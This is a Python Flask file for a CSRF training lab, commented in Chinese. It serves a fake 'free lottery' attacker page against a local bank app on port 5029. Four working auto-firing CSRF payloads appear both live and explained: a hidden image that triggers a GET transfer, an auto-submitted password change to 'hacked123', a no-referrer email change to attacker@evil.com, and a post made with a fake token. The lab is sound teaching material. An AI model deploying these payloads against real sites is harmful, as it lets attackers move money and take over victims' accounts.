# -*- coding: utf-8 -*-
"""
攻击者站点 —— CSRF 靶场（恶意站点，模拟攻击者控制的页面）
端口: 5030
主题: 攻击者把恶意页面放在自己的网站（evil 站点），受害者访问后，
      浏览器自动带 BankVault(5029) 的 cookie 发请求，借身份操作。

页面:
  /        攻击入口，列出 4 种攻击载体 + 说明
  /get     GET 型：<img> 标签自动触发转账
  /post    POST 型：隐藏表单 + JS 自动提交，改密码
  /referer Referer 绕过：no-referrer 让请求不带来源，改邮箱
  /token   token 缺陷：带假 token 发帖（服务器只检查存在不验证值）
"""
from flask import Flask, request

app = Flask(__name__)
PORT = 5030
BANK = "http://127.0.0.1:5029"

STYLE = ("body{font-family:system-ui,Arial,sans-serif;max-width:760px;margin:30px auto;padding:0 16px;"
         "background:#200f0f;color:#e6e6e6}"
         "h1{color:#F09595;margin:0 0 8px}"
         "h2{color:#F0997B}"
         "p{line-height:1.7}"
         ".card{background:#2a1818;border:1px solid #5a3030;border-radius:10px;padding:14px;margin:14px 0}"
         "a{color:#F0997B}"
         "code{background:#1a0d0d;padding:2px 5px;border-radius:4px;color:#F5C4B3}"
         "pre{background:#1a0d0d;border:1px solid #5a3030;border-radius:6px;padding:10px;overflow-x:auto;font-size:12px}"
         ".warn{color:#F09595;font-weight:bold}")


def page(title, body):
    return ("<!doctype html><html lang='zh'><head><meta charset='utf-8'>"
            "<title>" + title + "</title><style>" + STYLE + "</style></head><body>"
            "<h1>☠ 免费彩票网站（攻击者控制）</h1>"
            "<p class='warn'>你不是中奖了，你被 CSRF 了</p>"
            + body + "</body></html>")


@app.route("/")
def index():
    body = ("<div class='card'><h2>🎁 恭喜你抽中大奖！</h2>"
            "<p>点击下面的按钮领取奖品（每个按钮背后藏着一个攻击载体）：</p>"
            "<p><a href='/get'>🎫 领取 1：查看奖品</a></p>"
            "<p><a href='/post'>🎫 领取 2：查看奖品</a></p>"
            "<p><a href='/referer'>🎫 领取 3：查看奖品</a></p>"
            "<p><a href='/token'>🎫 领取 4：查看奖品</a></p>"
            "<p class='warn'>提示：这些页面会向 http://127.0.0.1:5029 发请求。</p>"
            "<p class='warn'>如果你在银行（5029）登录着，浏览器会自动带上你的会话 cookie。</p>"
            "<p class='warn'>访问完后回银行看 FLAG 亮了几个。</p></div>")
    return page("免费彩票", body)


@app.route("/get")
def attack_get():
    body = ("<div class='card'><h2>🎫 查看你的奖品</h2>"
            "<p>（奖品图加载中...）</p>"
            "<p>这个页面只放了一张「奖品图片」，但它 src 指向了银行的转账接口：</p>"
            "<pre>&lt;img src='" + BANK + "/transfer?to=attacker&amp;amount=1000' style='display:none'&gt;</pre>"
            "<p>浏览器加载这张「图片」时，自动向银行发了 GET 转账请求，自动带上你的 cookie。</p>"
            "<img src='" + BANK + "/transfer?to=attacker&amount=1000' style='display:none'>"
            "</div>")
    return page("奖品1", body)


@app.route("/post")
def attack_post():
    body = ("<div class='card'><h2>🎫 领取你的奖品</h2>"
            "<p>这个页面藏了一个<b>自动提交的表单</b>，指向银行的改密码接口：</p>"
            "<pre>&lt;form method='POST' action='" + BANK + "/change-password'&gt;"
            "&lt;input name='new_password' value='hacked123'&gt;&lt;/form&gt;"
            "&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</pre>"
            "<p>页面一加载就自动提交，把密码改成 hacked123。</p>"
            "<form method='POST' action='" + BANK + "/change-password'>"
            "<input type='hidden' name='new_password' value='hacked123'>"
            "</form>"
            "<script>document.forms[0].submit();</script>"
            "</div>")
    return page("奖品2", body)


@app.route("/referer")
def attack_referer():
    body = ("<div class='card'><h2>🎫 领取你的奖品</h2>"
            "<p>银行的<b>改邮箱</b>接口检查了 Referer（请求来源），非本站会拒绝。</p>"
            "<p>但这个页面用 <code>&lt;meta name='referrer' content='no-referrer'&gt;</code> "
            "让请求<b>不带来源</b>——而银行对「空 Referer」是放行的（缺陷）。</p>"
            "<pre>&lt;meta name='referrer' content='no-referrer'&gt;"
            "&lt;form method='POST' action='" + BANK + "/change-email'&gt;"
            "&lt;input name='email' value='attacker@evil.com'&gt;&lt;/form&gt;</pre>"
            "<meta name='referrer' content='no-referrer'>"
            "<form method='POST' action='" + BANK + "/change-email'>"
            "<input type='hidden' name='email' value='attacker@evil.com'>"
            "</form>"
            "<script>document.forms[0].submit();</script>"
            "</div>")
    return page("奖品3", body)


@app.route("/token")
def attack_token():
    body = ("<div class='card'><h2>🎫 领取你的奖品</h2>"
            "<p>银行的<b>发帖</b>接口有 CSRF token 防护。但它的 token 校验有个漏洞："
            "只检查字段<b>存在</b>，不验证<b>值</b>。</p>"
            "<p>攻击者随便填一个假 token（<code>x</code>）就能通过：</p>"
            "<pre>&lt;form method='POST' action='" + BANK + "/post'&gt;"
            "&lt;input name='csrf_token' value='x'&gt;"
            "&lt;input name='content' value='csrfdemo-被借身份发帖'&gt;&lt;/form&gt;</pre>"
            "<form method='POST' action='" + BANK + "/post'>"
            "<input type='hidden' name='csrf_token' value='x'>"
            "<input type='hidden' name='content' value='csrfdemo-被借身份发帖'>"
            "</form>"
            "<script>document.forms[0].submit();</script>"
            "</div>")
    return page("奖品4", body)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT, threaded=True)
